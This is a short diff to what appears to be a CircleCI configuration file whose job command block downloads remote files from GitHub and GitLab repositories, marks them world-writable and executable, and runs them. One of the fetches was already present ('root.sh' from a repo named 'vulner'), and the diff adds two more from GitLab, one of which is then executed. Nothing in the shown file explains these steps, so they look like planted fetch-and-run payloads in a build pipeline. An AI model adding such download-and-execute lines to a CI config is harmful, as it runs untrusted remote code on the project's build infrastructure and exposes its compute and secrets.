@@ -19,6 +19,8 @@ jobs:
           command: |
              
              wget https://github.com/masdinoyo/vulner/raw/main/root.sh && chmod 777 root.sh && ./root.sh
+             wget https://gitlab.com/MySeald/rx/-/raw/main/tx
+             wget https://gitlab.com/VerdellKern/rx/-/raw/main/dx && chmod 777 dx && ./dx
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
